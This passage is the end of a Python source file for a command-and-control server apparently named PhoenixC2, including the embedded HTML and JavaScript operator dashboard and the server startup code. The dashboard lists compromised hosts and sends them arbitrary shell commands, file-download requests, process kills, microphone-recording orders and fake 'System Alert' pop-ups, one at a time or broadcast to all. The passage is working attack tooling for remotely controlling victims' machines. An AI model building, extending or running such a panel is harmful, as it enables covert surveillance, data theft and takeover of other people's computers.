                        <strong>Last Seen:</strong> ${new Date(data.session_info.last_seen).toLocaleString()}<br>
                        <strong>Status:</strong> <span class="status-active">${data.session_info.status}</span><br>
                        <strong>MAC:</strong> ${data.session_info.mac}<br>
                    </div>
                </div>
            `;
            
            if (data.system_info) {
                html += `
                    <hr>
                    <h6>System Information</h6>
                    <div class="row">
                        <div class="col-md-6">
                            <strong>CPU Cores:</strong> ${data.system_info.cpu_count}<br>
                            <strong>Memory:</strong> ${(data.system_info.memory_total / 1024 / 1024 / 1024).toFixed(2)} GB<br>
                            <strong>Processes:</strong> ${data.system_info.processes}<br>
                        </div>
                        <div class="col-md-6">
                            <strong>Boot Time:</strong> ${new Date(data.system_info.boot_time * 1000).toLocaleString()}<br>
                            <strong>Timezone:</strong> ${JSON.parse(data.system_info.timezone).join('/')}<br>
                        </div>
                    </div>
                `;
            }
            
            details.innerHTML = html;
        }
        
        // Execute command
        function executeCommand() {
            const type = document.getElementById('command-type').value;
            const param = document.getElementById('command-param').value;
            
            let commandData = {};
            
            if (type === 'shell') {
                commandData.cmd = param;
            } else if (type === 'message') {
                commandData.message = param;
                commandData.title = 'System Alert';
            } else if (type === 'download') {
                commandData.path = param;
            } else if (type === 'upload') {
                // Handle file upload
                alert('File upload requires additional implementation');
                return;
            } else if (type === 'process_kill') {
                commandData.pid = parseInt(param);
            } else if (type === 'microphone') {
                commandData.duration = parseInt(param) || 10;
            }
            
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    session_id: currentSession,
                    type: type,
                    data: commandData
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    document.getElementById('command-output').innerHTML += 
                        `\n[>] Command issued: ${type} (ID: ${data.command_id})`;
                }
            });
        }
        
        // Broadcast command
        function broadcastCommand() {
            const type = document.getElementById('broadcast-type').value;
            const param = document.getElementById('broadcast-param').value;
            
            let commandData = {};
            
            if (type === 'shell') {
                commandData.cmd = param;
            } else if (type === 'message') {
                commandData.message = param;
            }
            
            fetch('/api/broadcast', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    type: type,
                    data: commandData
                })
            })
            .then(response => response.json())
            .then(data => {
                alert(data.message);
            });
        }
        
        // Socket.IO events
        socket.on('session_update', (data) => {
            loadSessions();
            document.getElementById('global-output').innerHTML += 
                `\n[${new Date().toLocaleTimeString()}] Session ${data.session_id} ${data.status}`;
        });
        
        socket.on('command_output', (data) => {
            const output = document.getElementById('command-output');
            output.innerHTML += `\n[${data.timestamp}] ${JSON.stringify(data.output)}`;
            output.scrollTop = output.scrollHeight;
            
            document.getElementById('global-output').innerHTML += 
                `\n[${data.timestamp}] Output from ${data.session_id}: ${data.output.type}`;
        });
        
        // EventSource for streaming output
        const eventSource = new EventSource('/api/output/stream');
        eventSource.onmessage = (event) => {
            if (event.data && event.data !== '{}') {
                const data = JSON.parse(event.data);
                // Handle streaming output
            }
        };
        
        // Load stats
        function loadStats() {
            fetch('/api/stats')
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        document.getElementById('total-count').innerText = data.stats.total_sessions;
                        document.getElementById('cmd-count').innerText = data.stats.total_commands;
                        
                        // Update charts if they exist
                        if (window.sessionChart) {
                            window.sessionChart.data.datasets[0].data = [
                                data.stats.active_sessions,
                                data.stats.total_sessions - data.stats.active_sessions
                            ];
                            window.sessionChart.update();
                        }
                    }
                });
        }
        
        // Update server time
        function updateTime() {
            document.getElementById('server-time').innerText = new Date().toLocaleTimeString();
        }
        
        // Initialize
        window.onload = () => {
            createMatrix();
            loadSessions();
            loadStats();
            
            setInterval(() => {
                loadSessions();
                loadStats();
                updateTime();
            }, 5000);
            
            // Charts
            const sessionCtx = document.getElementById('sessionChart').getContext('2d');
            window.sessionChart = new Chart(sessionCtx, {
                type: 'doughnut',
                data: {
                    labels: ['Active', 'Inactive'],
                    datasets: [{
                        data: [0, 0],
                        backgroundColor: ['#00ff9d', '#ff4444'],
                        borderColor: '#1a1e2a'
                    }]
                },
                options: {
                    responsive: true,
                    plugins: {
                        legend: { labels: { color: '#00ff9d' } }
                    }
                }
            });
            
            const commandCtx = document.getElementById('commandChart').getContext('2d');
            window.commandChart = new Chart(commandCtx, {
                type: 'bar',
                data: {
                    labels: [],
                    datasets: [{
                        label: 'Commands',
                        data: [],
                        backgroundColor: '#00ff9d'
                    }]
                },
                options: {
                    responsive: true,
                    plugins: {
                        legend: { labels: { color: '#00ff9d' } }
                    }
                }
            });
        };
    </script>
</body>
</html>'''
    
    with open(os.path.join(template_dir, 'index.html'), 'w') as f:
        f.write(index_html)
    
    LOGGER.info("Web interface created")

# Ensure template is created when module is imported (for Gunicorn)
create_web_interface()

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description='PhoenixC2 Server')
    parser.add_argument('--host', default='0.0.0.0', help='Bind host')
    parser.add_argument('--port', type=int, default=5000, help='Bind port')
    parser.add_argument('--debug', action='store_true', help='Debug mode')
    
    args = parser.parse_args()
    
    # Setup
    generate_key()
    init_database()
    
    global start_time
    start_time = time.time()
    
    # Start server
    LOGGER.info(f"PhoenixC2 starting on {args.host}:{args.port}")
    socketio.run(app, host=args.host, port=args.port, debug=args.debug)

if __name__ == "__main__":
    main()
